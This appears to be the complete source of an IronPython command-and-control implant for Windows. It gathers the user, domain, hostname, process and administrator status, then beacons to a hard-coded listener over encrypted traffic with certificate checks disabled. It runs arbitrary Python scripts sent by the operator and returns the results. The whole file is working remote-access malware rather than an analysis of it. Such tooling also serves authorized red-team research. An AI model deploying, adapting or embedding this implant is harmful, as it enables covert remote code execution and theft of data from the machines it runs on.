# -*- coding: utf-8 -*-

import clr
#clr.AddReference(IronPythonDLL)
clr.AddReference("IronPython")
clr.AddReference("System.Management")
clr.AddReference("System.Web.Extensions")
from System.Text import Encoding
from System import Convert, Guid, Environment, Uri, Console, Array, Byte, Random
from System.Management import ManagementObject
from System.Diagnostics import Process
from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
from System.IO.Compression import GZipStream, CompressionMode
from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache
from System.Net.Security import RemoteCertificateValidationCallback
from System.Threading import Thread
from System.Security.Cryptography import Aes, AsymmetricAlgorithm, CryptoStream, CryptoStreamMode
from System.Threading.Tasks import Task
from System.Web.Script.Serialization import JavaScriptSerializer
from IronPython.Hosting import Python

DEBUG = True
URL = "https://172.16.164.1:5000/"


def urljoin(*args):
    return "/".join(arg.strip("/") for arg in args)


class ECDHE(object):
    def __init__(self):
        self.aes = Aes.Create()
        self.diffieHellman = AsymmetricAlgorithm.Create("ECDiffieHellmanCng")
        self.IV = self.aes.IV

    @property
    def PublicKey(self):
        return self.diffieHellman.PublicKey.ToXmlString()

    def Encrypt(self, publicKeyXml, secretMessage):
        key = self.diffieHellman.PublicKey.FromXmlString(publicKeyXml)
        derivedKey = self.diffieHellman.DeriveKeyMaterial(key)
        #print "Derived Key: {}".format(derivedKey)
        self.aes.Key = derivedKey

        with MemoryStream() as cipherText:
            with self.aes.CreateEncryptor() as encryptor:
                with CryptoStream(cipherText, encryptor, CryptoStreamMode.Write) as cryptoStream:
                    ciphertextMessage = Encoding.UTF8.GetBytes(secretMessage)
                    cryptoStream.Write(ciphertextMessage, 0, ciphertextMessage.Length)

            return cipherText.ToArray()

    def Decrypt(self, publicKeyXml, iv, encryptedMessage):
        key = self.diffieHellman.PublicKey.FromXmlString(publicKeyXml)
        derivedKey = self.diffieHellman.DeriveKeyMaterial(key)
        #print "Derived Key: {}".format(derivedKey)

        encryptedMessage = Array[Byte](bytearray(encryptedMessage))

        self.aes.Key = derivedKey
        self.aes.IV = Array[Byte](bytearray(iv))

        with MemoryStream() as plainText:
            with self.aes.CreateDecryptor() as decryptor:
                with CryptoStream(plainText, decryptor, CryptoStreamMode.Write) as cryptoStream:
                    cryptoStream.Write(encryptedMessage, 0, encryptedMessage.Length)

            return Encoding.UTF8.GetString(plainText.ToArray())


class MuhStream(Stream):

    def __init__(self):
        self.string = ''

    def Write(self, bytes, offset, count):
        # Turn the byte-array back into a string
        self.string += Encoding.UTF8.GetString(bytes, offset, count)

    @property
    def CanRead(self):
        return False

    @property
    def CanSeek(self):
        return False

    @property
    def CanWrite(self):
        return True

    def Flush(self):
        pass

    def Close(self):
        pass

    @property
    def Position(self):
        return 0


class NotSerializable(Exception):
    pass


class Serializable(object):
    def __serialize__(self):
        class_dict = {}
        for key in self.__dict__.keys():
            value = getattr(self, key)
            if not callable(value):
                class_dict[key.lower()] = value

        return class_dict

#
#  
# Comms Section
#
#


class Response(object):
    def __init__(self, response):
        self.text = response
        self.text_unicode = Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(response))

    def json(self):
        return JavaScriptSerializer().DeserializeObject(self.text)


class Requests(object):
    def __init__(self, verify=False, proxy_aware=True, ssl_versions = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12):
        self.proxy_aware = proxy_aware
        ServicePointManager.SecurityProtocol = ssl_versions
        if not verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)

    def post(self, url, payload='', json=None):
        r = WebRequest.Create(url)
        r.Method = "POST"
        #r.Accept = "application/json"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        if json:
            r.ContentType = "application/json"
            if type(json) == dict:
                payload = JavaScriptSerializer().Serialize(json)
            elif hasattr(json, '__serialize__'):
                payload = JavaScriptSerializer().Serialize(json.__serialize__())
            else:
                raise NotSerializable("{} object is not serializable".format(type(json)))

        if len(payload):
            data = Encoding.ASCII.GetBytes(payload)
            r.ContentLength = data.Length
            requestStream = r.GetRequestStream()
            requestStream.Write(data, 0, data.Length)
            requestStream.Close()

        response = r.GetResponse()
        responseStream = StreamReader(response.GetResponseStream())
        return Response(responseStream.ReadToEnd())

    def get(self, url):
        r = WebRequest.Create(url)
        r.Method = "GET"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials
        #r.ContentType = "application/json"
        #r.Accept = "application/json"

        response = r.GetResponse()
        responseStream = StreamReader(response.GetResponseStream())
        return Response(responseStream.ReadToEnd())


class Comms(object):
    def __init__(self, GUID):
        self.requests = Requests()
        self.guid = GUID
        self.ecdhe = ECDHE()

        # Listener URLs
        self.base_url = str(Uri(Uri(URL), self.guid))  # This needs to be a tuple of callback domains (eventually)
        self.jobs_url = urljoin(self.base_url, '/jobs')

        self.server_pubkey = None
        self.server_iv = None

    def encode_and_compress(self, payload):
        random_bytes = Array.CreateInstance(Byte, 2)
        Random().NextBytes(random_bytes)
        with MemoryStream(payload.Length) as initialStream:
            initialStream.Write(payload, 0, payload.Length)
            initialStream.Seek(0, SeekOrigin.Begin)
            with MemoryStream() as resultStream:
                with GZipStream(resultStream, CompressionMode.Compress) as zipStream:
                    buffer = Array.CreateInstance(Byte, 4096)
                    bytesRead = initialStream.Read(buffer, 0, buffer.Length)
                    zipStream.Write(buffer, 0, bytesRead)
                    while bytesRead != 0:
                        bytesRead = initialStream.Read(buffer, 0, buffer.Length)
                        zipStream.Write(buffer, 0, bytesRead)

                result = resultStream.ToArray()
                result[:2] = random_bytes
                payload = {
                    Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 8): Convert.ToBase64String(Guid.NewGuid().ToByteArray()),
                    "data": Convert.ToBase64String(result)
                }

                return payload

    def decode_and_decompress(self, job_data):
        buffer = Convert.FromBase64String(job_data)
        buffer[:2] = Array[Byte](bytearray(b"\x1f\x8b"))
        with MemoryStream(buffer.Length) as compressedStream:
            compressedStream.Write(buffer, 0, buffer.Length)
            compressedStream.Seek(0, SeekOrigin.Begin)
            with GZipStream(compressedStream, CompressionMode.Decompress) as zipStream:
                with MemoryStream() as resultStream:
                    zipStream.CopyTo(resultStream)
                    return JavaScriptSerializer().DeserializeObject(Encoding.UTF8.GetString(resultStream.ToArray()))

    def send_job_results(self, results):
        job_id = results['id']

        payload = JavaScriptSerializer().Serialize(results)

        encrypted_payload = self.ecdhe.Encrypt(self.server_pubkey, payload)
        compressed_encrypted_payload = self.encode_and_compress(encrypted_payload)

        self.requests.post(urljoin(self.jobs_url, job_id), json=compressed_encrypted_payload)

        #Generate new keys
        self.ecdhe = ECDHE()

    def get_job(self):
        payload = JavaScriptSerializer().Serialize({
            'pubkey': self.ecdhe.PublicKey,
            'iv': Convert.ToBase64String(self.ecdhe.IV)
        })

        keydata = self.encode_and_compress(Array[Byte](bytearray(payload)))
        r = self.requests.post(self.jobs_url, json=keydata).json()

        if len(r):
            job_data = self.decode_and_decompress(r['data'])
            print job_data
            self.server_pubkey = job_data['pubkey']
            self.server_iv = Convert.FromBase64String(job_data['iv'])

            decrypted = self.ecdhe.Decrypt(self.server_pubkey, self.server_iv, Convert.FromBase64String(job_data['data']))
            print decrypted

            return dict(JavaScriptSerializer().DeserializeObject(decrypted))

        self.ecdhe = ECDHE()
        return None

    def __str__(self):
        return 'https'


#
#
# End Comms Section
#
#

class STClient(Serializable):
    def __init__(self):
        p = Process.GetCurrentProcess()

        self.GUID = Guid().NewGuid().ToString()
        self.COMMS = Comms(self.GUID)
        self.SLEEP = 5000
        self.JITTER = 5000
        self.URL = self.COMMS.base_url
        self.USERNAME = Environment.UserName
        self.DOMAIN = Environment.UserDomainName
        self.HIGH_INTEGRITY = self.is_high_integrity()
        #self.IP = ManagementObject("Win32_NetworkAdapterConfiguration")
        #self.OS = ManagementObject("Win32_OperatingSystem")
        self.PROCESS = p.Id
        self.PROCESS_NAME = p.ProcessName
        self.HOSTNAME = Environment.MachineName
        self.JOBS = []

        self.main()

    def is_high_integrity(self):
        identity = WindowsIdentity.GetCurrent()
        principal = WindowsPrincipal(identity)
        return principal.IsInRole(WindowsBuiltInRole.Administrator)

    def main(self):
        while True:
            try:
                job = self.COMMS.get_job()

                if job is not None:
                    t = Task[long](lambda: self.run_job(job))
                    t.Start()
            except Exception as e:
                if DEBUG: print "Error performing HTTP request: " + str(e)
                import traceback
                traceback.print_exc()
            finally:
                #If c# main function is STAThread or if running from ipy
                Thread.CurrentThread.Join(self.SLEEP)
                #Thread.Sleep(client.SLEEP)

    def run_job(self, job):
        payload = {'id': job['id']}
        if DEBUG: print "Running job (id: {})".format(job['id'])
        try:
            result = getattr(self, job['command'])(job['job'])
            payload['state'] = 'success'
            payload['result'] = result
        except AttributeError as e:
            #traceback.print_exc()
            payload['state'] = 'error'
            payload['result'] = 'Unknown command {}'.format(job['command'], e)
        except Exception as e:
            #traceback.print_exc()
            payload['state'] = 'error'
            payload['result'] = 'Exception when executing command {}: {}'.format(job['command'], e)

        while True:
            try:
                self.COMMS.send_job_results(payload)
                return
            except Exception as e:
                if DEBUG: print "Error sending job results (id: {}): {}".format(job['id'], e)
                Thread.Sleep(self.SLEEP)

    def run_script(self, data):
        stream = MuhStream()
        engine = Python.CreateEngine()
        engine.Runtime.IO.SetOutput(stream, Encoding.UTF8)
        engine.Runtime.IO.SetErrorOutput(stream, Encoding.UTF8)
        #scope = engine.CreateScope()
        #scope.SetVariable("client", self)
        engine.Execute(data)
        return stream.string

    def checkin(self, data):
        return self.__serialize__()

    def sleep(self, data):
        self.SLEEP = int(data['time'])
        return 'Updated'


STClient()
